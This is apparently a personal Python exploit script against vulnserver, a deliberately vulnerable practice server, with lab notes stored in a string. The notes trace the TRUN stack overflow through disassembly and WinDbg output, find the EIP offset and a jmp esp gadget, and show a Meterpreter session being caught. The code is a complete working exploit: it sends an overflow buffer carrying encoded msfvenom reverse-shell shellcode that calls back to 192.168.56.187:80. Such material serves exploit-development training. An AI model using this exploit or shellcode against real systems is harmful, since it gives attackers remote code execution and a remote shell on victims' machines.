#!/usr/bin/env python3
import os, sys, re, socket, binascii
from struct import pack, unpack
from IPython import embed

### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c 'bp ws2_32!recv; g'
### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c ' bp 00401937; g'
### ((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c ' bp 00401937; g'

NOTES=r"""
┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ ./poc.py 192.168.56.100:9999
Welcome to Vulnerable Server! Enter HELP for help.

Valid Commands:
HELP
STATS [stat_value]      ; not_exploitable
RTIME [rtime_value]     ; not_exploitable
LTIME [ltime_value]     ; not_exploitable
SRUN [srun_value]       ; not_exploitable
TRUN [trun_value]       ; exploitable
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT

TRUN however does appear to be interesting.  Namely,
.text:00401E1E mov     dword ptr [esp], 0BB8h ; Size        <------
.text:00401E25 call    _malloc

Above, 0xbb8 is malloc'd.  Later down the chain, we end up in the following basic block:
.text:00401E8B
.text:00401E8B loc_401E8B:             ;
.text:00401E8B mov     eax, [ebp+var_20] ; 0x5      ;??
.text:00401E8E cmp     eax, [ebp+len]  ; 0x1000     ; sent_bufsz
.text:00401E91 jl      short loc_401E51 ; [br=1]

This basic block is the interesting one.  Essentially, if the first byte of the overflow string is 0x2e, we won't take the jump:
.text:00401E51
.text:00401E51 loc_401E51:             ;
.text:00401E51 mov     edx, [ebp+var_20] ; 5
.text:00401E54 mov     eax, [ebp+buf]  ; 00aa4f70  (heap)
.text:00401E57 add     eax, edx
.text:00401E59 movzx   eax, byte ptr [eax] ; 0x41 1st byte of \x41 overflow str
.text:00401E5C cmp     al, 2Eh ; '.'
.text:00401E5E jnz     short loc_401E87

And if we don't take the jump, we end up here:
.text:00401E60 mov     dword ptr [esp+8], 0BB8h ; Count
.text:00401E68 mov     eax, [ebp+buf]
.text:00401E6B mov     [esp+4], eax    ; Source
.text:00401E6F mov     eax, [ebp+var_4C]
.text:00401E72 mov     [esp], eax      ; Destination
.text:00401E75 call    _strncpy
.text:00401E7A mov     eax, [ebp+var_4C]
.text:00401E7D mov     [esp], eax      ; Source
.text:00401E80 call    _Function3                       <-------
.text:00401E85 jmp     short loc_401E93

I have pointed at a very interesting call, to a "_Function3".  Here's what that looks like:
.text:0040191E public _Function3
.text:0040191E _Function3 proc near
.text:0040191E
.text:0040191E Destination= byte ptr -7D8h
.text:0040191E Source= dword ptr  8
.text:0040191E
.text:0040191E ; __unwind {
.text:0040191E push    ebp
.text:0040191F mov     ebp, esp
.text:00401921 sub     esp, 7E8h
.text:00401927 mov     eax, [ebp+Source]
.text:0040192A mov     [esp+4], eax    ; Source
.text:0040192E lea     eax, [ebp+Destination]
.text:00401934 mov     [esp], eax      ; Destination
.text:00401937 call    _strcpy
.text:0040193C nop
.text:0040193D leave
.text:0040193E retn

Notice above, esp is sub'd 0x7e8, but this function doesn't specify a size.  I am guessing based on what I have seen so far that there is a potential overflow here.  let's step to it and check it out.  I'll update the PoC to include 0x2e as the first byte following the space in "TRUN ".

I'll also set a breakpoint on the call:
.text:00401E80 call    _Function3

ESP at the call:
0:001> dc esp
00a1fa08  00aa8350 00aa6f40 00000bb8 00000000  P...@o..........
00a1fa18  006aa098 006a0000 00000002 00000001  ..j...j.........

But I don't think that's enough.  The key is going to be whatever value is at esp+0x8 after sub'ing 0x7e8 from esp.  I'll continue execution to the call to _strcpy in _Function3.

Interestingly, ESP at the call:
0:001> dd esp
00a1f218  00a1f228 00aa8350 00000000

Hard to tell what is going to happen, but I am thinking this call may overflow because no size is specified, but it is possible also that it will do nothing.  I'll step over the call and inspect.


Real quick though, here are the registers before executing the call:
0:001> r
eax=00a1f228 ebx=00000110 ecx=00000000 edx=41414141 esi=00401960 edi=00401960
eip=00401937 esp=00a1f218 ebp=00a1fa00 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
vulnserver+0x1937:
00401937 e84c320000      call    vulnserver+0x4b88 (00404b88)

Well after the call, esp was written to:
00a1f218 00a1f228 00aa8350 00000000 00000000 4e555254
00a1f22c 41412e20 41414141 41414141 41414141 41414141
00a1f240 41414141 41414141 41414141 41414141 41414141

But the overflow string only extends a total of 0xbc0-ish bytes.

The call stack is however overwritten, interestingly enough:
0:001>
 # ChildEBP RetAddr
 WARNING:  Stack unwind information not available.  Follwoing frames may be wrong.
 00 00a1fa00 41414141       vulnserver+0x193c
 01 00a1fa04 41414141       0x41414141
 02 00a1fa08 41414141       0x41414141
 03 00a1fa0c 41414141       0x41414141
 [...]

(kali crashed, so memory refs changed)

After returning out of the _Function3, EIP is controlled:
0:004> 
eax=0118f228 ebx=00000118 ecx=00f85b30 edx=0000a48e esi=00401960 edi=00401960
eip=41414141 esp=0118fa08 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
41414141 ??              ???

ESP at crash is +0x7d8-ish bytes... we'll figure out proper offsets later.
0:004> dd esp-7d8-0x8
0118f228  4e555254 41412e20 41414141 41414141
0118f238  41414141 41414141 41414141 41414141
0118f248  41414141 41414141 41414141 41414141


With a buffer like:
    oflow_sz = 0x1000
    buf = "TRUN \x2e"
    buf += sys.argv[2]

./trun.py 192.168.56.100:9999 $(msf-pattern_create -l 0x1000)

EIP crash contains:
396f4338 

┌──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ msf-pattern_offset -l 0x1000 -q 396f4338 
[*] Exact match at offset 2006

Something like the following ought to be able to determine what badchars there are, and confirm crash EIP is controlled.

    oflow_sz = 0x1000
    crash_offset = 2006

    opcode = "TRUN \x2e"
    start = "\x41" * (crash_offset)
    EIP = packlatin("<L",0x42424242)
    bad = gen_badchars(badchars,"\x00","\xff")
    slack = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        start,
        EIP,
        bad
    ]])))

    buf = f"{opcode}{start}{EIP}{bad}{slack}"

Of course, windbg set up like:
((cmd.exe /c "taskkill /F /IM vulnserver.exe" && timeout 3 && START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "C:\users\admin\desktop\current_thing\vulnserver.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn vulnserver.exe -c ' bp 00401937; g'

After exiting out of _Function3:
0:003> 
eax=0104f228 ebx=00000118 ecx=00c45754 edx=00000000 esi=00401960 edi=00401960
eip=42424242 esp=0104fa08 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
42424242 ??              ???

EIP is controlled, but looks like null must be a bad byte, because none of the badchars pattern string showed up in ESP:
0104fa08 00c44f00 00c43b60 00000bb8 00000000 007500c0
0104fa1c 00750000 00000002 00000001 01000138 00000004

Only null byte appears to be a badchar, all else are good here.

0:003> db esp L0xff
00fcfa08  01 02 03 04 05 06 07 08-09 0a 0b 0c 0d 0e 0f 10  ................
00fcfa18  11 12 13 14 15 16 17 18-19 1a 1b 1c 1d 1e 1f 20  ............... 
00fcfa28  21 22 23 24 25 26 27 28-29 2a 2b 2c 2d 2e 2f 30  !"#$%&'()*+,-./0
00fcfa38  31 32 33 34 35 36 37 38-39 3a 3b 3c 3d 3e 3f 40  123456789:;<=>?@
00fcfa48  41 42 43 44 45 46 47 48-49 4a 4b 4c 4d 4e 4f 50  ABCDEFGHIJKLMNOP
00fcfa58  51 52 53 54 55 56 57 58-59 5a 5b 5c 5d 5e 5f 60  QRSTUVWXYZ[\]^_`
00fcfa68  61 62 63 64 65 66 67 68-69 6a 6b 6c 6d 6e 6f 70  abcdefghijklmnop
00fcfa78  71 72 73 74 75 76 77 78-79 7a 7b 7c 7d 7e 7f 80  qrstuvwxyz{|}~..
00fcfa88  81 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  ................
00fcfa98  91 92 93 94 95 96 97 98-99 9a 9b 9c 9d 9e 9f a0  ................
00fcfaa8  a1 a2 a3 a4 a5 a6 a7 a8-a9 aa ab ac ad ae af b0  ................
00fcfab8  b1 b2 b3 b4 b5 b6 b7 b8-b9 ba bb bc bd be bf c0  ................
00fcfac8  c1 c2 c3 c4 c5 c6 c7 c8-c9 ca cb cc cd ce cf d0  ................
00fcfad8  d1 d2 d3 d4 d5 d6 d7 d8-d9 da db dc dd de df e0  ................
00fcfae8  e1 e2 e3 e4 e5 e6 e7 e8-e9 ea eb ec ed ee ef f0  ................
00fcfaf8  f1 f2 f3 f4 f5 f6 f7 f8-f9 fa fb fc fd fe ff     ...............

Next, need to find a jmp esp that doesn't contain a badchar in the address.

Luckily, essfunc.dll appears to be a good candidate.
.load narly
!nmod
[...]
62500000 62510000 essfunc              /SafeSEH OFF                C:\users\admin\desktop\current_thing\essfunc.dll
[...]

I'll use rp++-ng to try to find a suitable jmp instruction
──(notroot㉿Business-End)-[~/WUMED/extra/vulnserver]
└─$ rp++-ng -f essfunc.dll --va 0x62500000 -r8 -b "\x00" -su --regex ": jmp ... "

  rp++-ng?                           ^^           
             _________ _________      ___ __  __________ `
   .       |    _o___|    _o___ ++- |   \  |/   /_____/  !
          |___|\____|___|%%%%%     |____\_|\___\____.] 
  z        `BB' `BBB'`B'           `BBBBBBB' `BBBBBBBB' 
     ;                                    Chain faster
              [[                            $$$$$ $$$$$$      i
                    +                                    SYANiDE
        

[+] Pruned gadgets to unique occurrences
[+] curated gadget list saved to essfunc_curatedgadgets.txt
[+] REGEX: [: jmp ... ] : 8 results


######## : jmp ...  ########
0x625012f2: jmp eax ; 
0x62501340: jmp ebp ; 
0x6250130c: jmp ebx ; 
0x625012ff: jmp ecx ; 
0x62501319: jmp edi ; 
0x62501326: jmp edx ; 
0x62501333: jmp esi ; 
0x625012f0: jmp esp ;           <-----
[+] regex-selected gadget list saved to essfunc_regex-selectedgadgets.txt

The updated PoC becomes:
    oflow_sz = 0x1000
    crash_offset = 2006

    opcode = "TRUN \x2e"
    start = "\x41" * (crash_offset)
    EIP = packlatin("<L",0x625012f0)  ## 0x625012f0: jmp esp
    slack = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        start,
        EIP,
    ]])))

    buf = f"{opcode}{start}{EIP}{slack}"

At the breakpoint:
Breakpoint 0 hit
eax=0092f228 ebx=00000108 ecx=000d5b30 edx=00005edf esi=00401960 edi=00401960
eip=625012f0 esp=0092fa08 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
essfunc!EssentialFunc2+0x3:
625012f0 ffe4            jmp     esp {0092fa08}
0:001> dd esp-4
0092fa04  625012f0 43434343 43434343 43434343
0092fa14  43434343 43434343 43434343 43434343
0092fa24  43434343 43434343 43434343 43434343
0092fa34  43434343 43434343 43434343 43434343
0092fa44  43434343 43434343 43434343 43434343
0092fa54  43434343 43434343 43434343 43434343
0092fa64  43434343 43434343 43434343 43434343
0092fa74  43434343 43434343 43434343 43434343


The only thing left to do now is to add a shellcode and profit.

Shells well
┌──(notroot㉿Business-End)-[~/repos/rp++-ng]
└─$ sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.56.187
LPORT => 80
EXITFUNC => process
[*] Started reverse TCP handler on 192.168.56.187:80 
[*] Sending stage (175686 bytes) to 192.168.56.100
[*] Meterpreter session 1 opened (192.168.56.187:80 -> 192.168.56.100:49771) at 2023-05-23 01:02:29 -0700

meterpreter > getuid
Server username: DESKTOP-4NR4332\Admin
meterpreter > sysinfo
Computer        : DESKTOP-4NR4332
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
"""

def packlatin(fmt, inp):
        return pack(fmt, inp).decode('latin-1')

# def unpacklatin(fmt, inp):
#         return unpack(fmt, inp.encode('latin-1'))[0]

# def uniesc_to_bytestr(instring):
#     r""" '\\x58\\x59\\x5a\\xa0' -> 'XYZ\xa0' 
#         hexstrings in from cli, ex., argparse   """
#     return bytes(instring, 'utf-8').decode("unicode_escape")

# def bytestr_to_long(inbstr):
#     r""" 'XYZ\xa0' -> 2690275672 """
#     return unpack("I",bytes(inbstr,'latin-1'))[0]

# def long_to_bytestr(inlong):
#     r""" 2690275672 -> 'XYZ\xa0' """
#     return pack("<L", inlong).decode('latin-1')

# def octalstring_to_bytestr_pad(inoct):
#     r""" "0x200" -> '\x00\x02\x00\x00' (le) 
#         for the --va + --addbase scenario 
#         pad with \x00 to dword size bytes """
#     return pack("<L", (int(inoct,16))).decode('latin-1')

# def octalstring_to_bytestr_nopad(inoct):
#     r""" "0x200" -> '\x00\x02' (le) 
#         for the --va only scenario 
#         no padding with \x00 to dword size bytes """
#     octstr = inoct[2:]
#     if len(octstr) % 2 == 1:
#         octstr = f"0{octstr}"
#     return ''.join([chr(int(octstr[x:x+2],16)) for x in range(0,len(octstr),2)][::-1])

badchars = "\x00"
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC

def sender(ip, port, buf):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(buf.encode('latin-1'))
    return sock

def help(ip,port):
    buf = "HELP" 
    sock = sender(ip, port, buf)
    # print(sock.recv(4096))
    print(sock.recv(4096).decode('latin-1'))
    print(sock.recv(4096).decode('latin-1'))
    sock.close()

def main():
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} ip:port")
        sys.exit()
    else:
        ip, port = sys.argv[1].split(":")
        port = int(port)
    # help(ip,port)

    oflow_sz = 0x1000
    crash_offset = 2006

    opcode = "TRUN \x2e"
    start = "\x41" * (crash_offset)
    EIP = packlatin("<L",0x625012f0)  ## 0x625012f0: jmp esp
    nopsled = "\x90" * 0x20
    shellcode = (
        ## msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.187 LPORT=80 EXITFUNC=process -b "\x00" -e x86/xor_dynamic -f c
        ## sudo msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.187; set LPORT 80; set EXITFUNC process; run"

        "\xeb\x23\x5b\x89\xdf\xb0\xc8\xfc\xae\x75\xfd\x89\xf9\x89"
        "\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xb3\xfc\x74\x08\x46"
        "\x80\x3e\xc8\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff"
        "\x05\xc8\xf9\xed\x8a\x05\x05\x05\x65\x34\xd7\x61\x8e\x57"
        "\x35\x8c\xe0\x8e\x57\x09\x8e\x57\x11\x0a\xb2\x4f\x23\x34"
        "\xfa\x8e\x77\x2d\x34\xc5\xa9\x39\x64\x79\x07\x29\x25\xc4"
        "\xca\x08\x04\xc2\x4c\x70\xea\x57\x8e\x57\x15\x8e\x47\x39"
        "\x04\xd5\x52\x8e\x45\x7d\x80\xc5\x71\x49\x04\xd5\x8e\x5d"
        "\x25\x8e\x4d\x1d\x55\x04\xd6\x80\xcc\x71\x39\x4c\x34\xfa"
        "\x8e\x31\x8e\x04\xd3\x34\xc5\xa9\xc4\xca\x08\x04\xc2\x3d"
        "\xe5\x70\xf1\x06\x78\xfd\x3e\x78\x21\x70\xe5\x5d\x8e\x5d"
        "\x21\x04\xd6\x63\x8e\x09\x4e\x8e\x5d\x19\x04\xd6\x8e\x01"
        "\x8e\x04\xd5\x8c\x41\x21\x21\x5e\x5e\x64\x5c\x5f\x54\xfa"
        "\xe5\x5d\x5a\x5f\x8e\x17\xec\x85\xfa\xfa\xfa\x58\x6d\x36"
        "\x37\x05\x05\x6d\x72\x76\x37\x5a\x51\x6d\x49\x72\x23\x02"
        "\x8c\xed\xfa\xd5\xbd\x95\x04\x05\x05\x2c\xc1\x51\x55\x6d"
        "\x2c\x85\x6e\x05\xfa\xd0\x6f\x0f\x6d\xc5\xad\x3d\xbe\x6d"
        "\x07\x05\x05\x55\x8c\xe3\x55\x55\x55\x55\x45\x55\x45\x55"
        "\x6d\xef\x0a\xda\xe5\xfa\xd0\x92\x6f\x15\x53\x52\x6d\x9c"
        "\xa0\x71\x64\xfa\xd0\x80\xc5\x71\x0f\xfa\x4b\x0d\x70\xe9"
        "\xed\x62\x05\x05\x05\x6f\x05\x6f\x01\x53\x52\x6d\x07\xdc"
        "\xcd\x5a\xfa\xd0\x86\xfd\x05\x7b\x33\x8e\x33\x6f\x45\x6d"
        "\x05\x15\x05\x05\x53\x6f\x05\x6d\x5d\xa1\x56\xe0\xfa\xd0"
        "\x96\x56\x6f\x05\x53\x56\x52\x6d\x07\xdc\xcd\x5a\xfa\xd0"
        "\x86\xfd\x05\x78\x2d\x5d\x6d\x05\x45\x05\x05\x6f\x05\x55"
        "\x6d\x0e\x2a\x0a\x35\xfa\xd0\x52\x6d\x70\x6b\x48\x64\xfa"
        "\xd0\x5b\x5b\xfa\x09\x21\x0a\x80\x75\xfa\xfa\xfa\xec\x9e"
        "\xfa\xfa\xfa\x04\xc6\x2c\xc3\x70\xc4\xc6\xbe\xf5\xb0\xa7"
        "\x53\x6f\x05\x56\xfa\xd0\xb3\xfc" # 400
    )
    slack = "\x43" * (oflow_sz - sum(iter([len(x) for x in [
        opcode,
        start,
        EIP,
        nopsled,
        shellcode
    ]])))

    buf = f"{opcode}{start}{EIP}{nopsled}{shellcode}{slack}"
    sock = sender(ip, port, buf)


if __name__=="__main__":
    main()

